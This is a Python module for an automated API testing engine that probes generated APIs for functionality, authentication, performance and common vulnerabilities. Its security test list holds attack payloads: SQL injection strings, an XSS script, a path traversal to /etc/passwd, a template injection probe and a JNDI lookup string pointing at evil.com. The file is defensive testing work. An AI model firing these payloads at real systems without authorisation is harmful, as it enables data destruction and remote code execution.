"""
API Testing Engine
Automatically tests generated APIs for functionality and performance
"""

import asyncio
import aiohttp
import json
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
from pathlib import Path
import logging

from .config import settings

logger = logging.getLogger(__name__)

@dataclass
class TestResult:
    """Result of a single test"""
    endpoint: str
    method: str
    status_code: int
    response_time_ms: float
    success: bool
    error_message: Optional[str] = None
    response_data: Optional[Dict[str, Any]] = None

@dataclass
class TestSuite:
    """Collection of test results"""
    total_tests: int
    passed_tests: int
    failed_tests: int
    average_response_time: float
    results: List[TestResult]
    security_issues: List[str]
    performance_issues: List[str]

class APITester:
    """Automated API testing engine"""
    
    def __init__(self):
        self.session = None
        self.base_url = "http://localhost:8000"
        
        # Test configurations
        self.timeout = 10.0
        self.max_response_time = 2000  # 2 seconds
        
        # Security test payloads
        self.security_payloads = [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "admin' OR '1'='1",  # SQL injection
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # JNDI injection
        ]

    async def test_api(self, api_path: str, base_url: str = None) -> Dict[str, Any]:
        """
        Comprehensively test a generated API
        
        Args:
            api_path: Path to the generated API
            base_url: Base URL for testing (default: localhost:8000)
        
        Returns:
            Test results and recommendations
        """
        try:
            if base_url:
                self.base_url = base_url
            
            logger.info(f"Starting API tests for {api_path}")
            
            # Start test session
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                self.session = session
                
                # Discover API endpoints
                endpoints = await self._discover_endpoints()
                
                if not endpoints:
                    raise Exception("No endpoints discovered")
                
                # Run test suite
                test_results = []
                security_issues = []
                performance_issues = []
                
                # 1. Basic functionality tests
                basic_results = await self._test_basic_functionality(endpoints)
                test_results.extend(basic_results)
                
                # 2. Authentication tests
                auth_results = await self._test_authentication(endpoints)
                test_results.extend(auth_results)
                
                # 3. Security tests
                security_results, sec_issues = await self._test_security(endpoints)
                test_results.extend(security_results)
                security_issues.extend(sec_issues)
                
                # 4. Performance tests
                perf_results, perf_issues = await self._test_performance(endpoints)
                test_results.extend(perf_results)
                performance_issues.extend(perf_issues)
                
                # 5. Error handling tests
                error_results = await self._test_error_handling(endpoints)
                test_results.extend(error_results)
                
                # Calculate statistics
                total_tests = len(test_results)
                passed_tests = len([r for r in test_results if r.success])
                failed_tests = total_tests - passed_tests
                avg_response_time = sum(r.response_time_ms for r in test_results) / total_tests if test_results else 0
                
                test_suite = TestSuite(
                    total_tests=total_tests,
                    passed_tests=passed_tests,
                    failed_tests=failed_tests,
                    average_response_time=avg_response_time,
                    results=test_results,
                    security_issues=security_issues,
                    performance_issues=performance_issues
                )
                
                logger.info(f"API testing completed: {passed_tests}/{total_tests} tests passed")
                
                return {
                    "success": True,
                    "test_suite": asdict(test_suite),
                    "recommendations": self._generate_recommendations(test_suite),
                    "summary": {
                        "total_tests": total_tests,
                        "success_rate": (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                        "average_response_time": avg_response_time,
                        "security_score": max(0, 100 - len(security_issues) * 10),
                        "performance_score": max(0, 100 - len(performance_issues) * 15)
                    }
                }
                
        except Exception as e:
            logger.error(f"API testing failed: {str(e)}")
            raise Exception(f"API testing failed: {str(e)}")

    async def _discover_endpoints(self) -> List[Dict[str, Any]]:
        """Discover API endpoints from OpenAPI spec"""
        try:
            # Try to get OpenAPI spec
            async with self.session.get(f"{self.base_url}/openapi.json") as response:
                if response.status == 200:
                    spec = await response.json()
                    endpoints = []
                    
                    for path, methods in spec.get("paths", {}).items():
                        for method, details in methods.items():
                            endpoints.append({
                                "path": path,
                                "method": method.upper(),
                                "operation_id": details.get("operationId"),
                                "summary": details.get("summary"),
                                "parameters": details.get("parameters", []),
                                "security": details.get("security", [])
                            })
                    
                    return endpoints
                
        except Exception as e:
            logger.warning(f"Failed to discover endpoints from OpenAPI spec: {str(e)}")
        
        # Fallback: try common endpoints
        return [
            {"path": "/", "method": "GET", "operation_id": "root"},
            {"path": "/health", "method": "GET", "operation_id": "health"},
            {"path": "/docs", "method": "GET", "operation_id": "docs"}
        ]

    async def _test_basic_functionality(self, endpoints: List[Dict[str, Any]]) -> List[TestResult]:
        """Test basic endpoint functionality"""
        results = []
        
        for endpoint in endpoints:
            try:
                start_time = time.time()
                
                async with self.session.request(
                    endpoint["method"],
                    f"{self.base_url}{endpoint['path']}"
                ) as response:
                    response_time = (time.time() - start_time) * 1000
                    
                    success = response.status < 500  # Accept 4xx but not 5xx
                    error_message = None
                    response_data = None
                    
                    try:
                        response_data = await response.json()
                    except:
                        response_data = {"raw": await response.text()}
                    
                    if not success:
                        error_message = f"Server error {response.status}"
                    
                    results.append(TestResult(
                        endpoint=endpoint["path"],
                        method=endpoint["method"],
                        status_code=response.status,
                        response_time_ms=response_time,
                        success=success,
                        error_message=error_message,
                        response_data=response_data
                    ))
                    
            except Exception as e:
                results.append(TestResult(
                    endpoint=endpoint["path"],
                    method=endpoint["method"],
                    status_code=0,
                    response_time_ms=0,
                    success=False,
                    error_message=str(e)
                ))
        
        return results

    async def _test_authentication(self, endpoints: List[Dict[str, Any]]) -> List[TestResult]:
        """Test authentication and authorization"""
        results = []
        
        # Test endpoints that require authentication
        auth_endpoints = [ep for ep in endpoints if ep.get("security")]
        
        for endpoint in auth_endpoints:
            # Test without authentication
            try:
                start_time = time.time()
                
                async with self.session.request(
                    endpoint["method"],
                    f"{self.base_url}{endpoint['path']}"
                ) as response:
                    response_time = (time.time() - start_time) * 1000
                    
                    # Should return 401 Unauthorized
                    success = response.status == 401
                    error_message = None if success else f"Expected 401, got {response.status}"
                    
                    results.append(TestResult(
                        endpoint=f"{endpoint['path']} (no auth)",
                        method=endpoint["method"],
                        status_code=response.status,
                        response_time_ms=response_time,
                        success=success,
                        error_message=error_message
                    ))
                    
            except Exception as e:
                results.append(TestResult(
                    endpoint=f"{endpoint['path']} (no auth)",
                    method=endpoint["method"],
                    status_code=0,
                    response_time_ms=0,
                    success=False,
                    error_message=str(e)
                ))
            
            # Test with invalid token
            try:
                start_time = time.time()
                
                headers = {"Authorization": "Bearer invalid-token"}
                async with self.session.request(
                    endpoint["method"],
                    f"{self.base_url}{endpoint['path']}",
                    headers=headers
                ) as response:
                    response_time = (time.time() - start_time) * 1000
                    
                    # Should return 401 Unauthorized
                    success = response.status == 401
                    error_message = None if success else f"Expected 401, got {response.status}"
                    
                    results.append(TestResult(
                        endpoint=f"{endpoint['path']} (invalid token)",
                        method=endpoint["method"],
                        status_code=response.status,
                        response_time_ms=response_time,
                        success=success,
                        error_message=error_message
                    ))
                    
            except Exception as e:
                results.append(TestResult(
                    endpoint=f"{endpoint['path']} (invalid token)",
                    method=endpoint["method"],
                    status_code=0,
                    response_time_ms=0,
                    success=False,
                    error_message=str(e)
                ))
        
        return results

    async def _test_security(self, endpoints: List[Dict[str, Any]]) -> tuple[List[TestResult], List[str]]:
        """Test for common security vulnerabilities"""
        results = []
        security_issues = []
        
        for endpoint in endpoints:
            if endpoint["method"] in ["POST", "PUT", "PATCH"]:
                # Test with malicious payloads
                for payload in self.security_payloads:
                    try:
                        start_time = time.time()
                        
                        # Test in request body
                        data = {"test_param": payload}
                        
                        async with self.session.request(
                            endpoint["method"],
                            f"{self.base_url}{endpoint['path']}",
                            json=data
                        ) as response:
                            response_time = (time.time() - start_time) * 1000
                            
                            response_text = await response.text()
                            
                            # Check if payload is reflected in response
                            if payload in response_text:
                                security_issues.append(f"Potential XSS/injection vulnerability in {endpoint['path']}")
                            
                            # Success if server doesn't crash
                            success = response.status != 500
                            
                            results.append(TestResult(
                                endpoint=f"{endpoint['path']} (security test)",
                                method=endpoint["method"],
                                status_code=response.status,
                                response_time_ms=response_time,
                                success=success,
                                error_message=None if success else "Server error on malicious input"
                            ))
                            
                    except Exception as e:
                        results.append(TestResult(
                            endpoint=f"{endpoint['path']} (security test)",
                            method=endpoint["method"],
                            status_code=0,
                            response_time_ms=0,
                            success=False,
                            error_message=str(e)
                        ))
        
        return results, security_issues

    async def _test_performance(self, endpoints: List[Dict[str, Any]]) -> tuple[List[TestResult], List[str]]:
        """Test API performance"""
        results = []
        performance_issues = []
        
        # Test each endpoint multiple times for consistency
        for endpoint in endpoints:
            response_times = []
            
            for i in range(3):  # 3 requests per endpoint
                try:
                    start_time = time.time()
                    
                    async with self.session.request(
                        endpoint["method"],
                        f"{self.base_url}{endpoint['path']}"
                    ) as response:
                        response_time = (time.time() - start_time) * 1000
                        response_times.append(response_time)
                        
                        success = response.status < 500 and response_time < self.max_response_time
                        error_message = None
                        
                        if response_time > self.max_response_time:
                            error_message = f"Slow response: {response_time:.2f}ms"
                        
                        results.append(TestResult(
                            endpoint=f"{endpoint['path']} (perf test {i+1})",
                            method=endpoint["method"],
                            status_code=response.status,
                            response_time_ms=response_time,
                            success=success,
                            error_message=error_message
                        ))
                        
                except Exception as e:
                    results.append(TestResult(
                        endpoint=f"{endpoint['path']} (perf test {i+1})",
                        method=endpoint["method"],
                        status_code=0,
                        response_time_ms=0,
                        success=False,
                        error_message=str(e)
                    ))
            
            # Check for performance issues
            if response_times:
                avg_time = sum(response_times) / len(response_times)
                if avg_time > self.max_response_time:
                    performance_issues.append(f"Slow endpoint {endpoint['path']}: {avg_time:.2f}ms average")
        
        return results, performance_issues

    async def _test_error_handling(self, endpoints: List[Dict[str, Any]]) -> List[TestResult]:
        """Test error handling capabilities"""
        results = []
        
        for endpoint in endpoints:
            # Test with invalid data
            if endpoint["method"] in ["POST", "PUT", "PATCH"]:
                try:
                    start_time = time.time()
                    
                    # Send invalid JSON
                    invalid_data = "invalid json"
                    
                    async with self.session.request(
                        endpoint["method"],
                        f"{self.base_url}{endpoint['path']}",
                        data=invalid_data,
                        headers={"Content-Type": "application/json"}
                    ) as response:
                        response_time = (time.time() - start_time) * 1000
                        
                        # Should return 400 or 422 for invalid data
                        success = response.status in [400, 422]
                        error_message = None if success else f"Expected 400/422, got {response.status}"
                        
                        results.append(TestResult(
                            endpoint=f"{endpoint['path']} (error test)",
                            method=endpoint["method"],
                            status_code=response.status,
                            response_time_ms=response_time,
                            success=success,
                            error_message=error_message
                        ))
                        
                except Exception as e:
                    results.append(TestResult(
                        endpoint=f"{endpoint['path']} (error test)",
                        method=endpoint["method"],
                        status_code=0,
                        response_time_ms=0,
                        success=False,
                        error_message=str(e)
                    ))
        
        return results

    def _generate_recommendations(self, test_suite: TestSuite) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        # Success rate recommendations
        success_rate = (test_suite.passed_tests / test_suite.total_tests * 100) if test_suite.total_tests > 0 else 0
        
        if success_rate < 80:
            recommendations.append("API has low success rate. Review failed endpoints and fix errors.")
        
        # Performance recommendations
        if test_suite.average_response_time > self.max_response_time:
            recommendations.append(f"Average response time ({test_suite.average_response_time:.2f}ms) exceeds recommended maximum ({self.max_response_time}ms). Consider optimization.")
        
        # Security recommendations
        if test_suite.security_issues:
            recommendations.append("Security vulnerabilities detected. Implement input validation and output encoding.")
        
        # Specific issue recommendations
        for issue in test_suite.performance_issues:
            recommendations.append(f"Performance issue: {issue}")
        
        for issue in test_suite.security_issues:
            recommendations.append(f"Security issue: {issue}")
        
        # General recommendations
        if not any("auth" in r.endpoint for r in test_suite.results):
            recommendations.append("Consider implementing authentication for sensitive endpoints.")
        
        recommendations.append("Add comprehensive logging and monitoring.")
        recommendations.append("Implement rate limiting to prevent abuse.")
        recommendations.append("Add input validation and sanitization.")
        recommendations.append("Consider implementing API versioning.")
        
        return recommendations
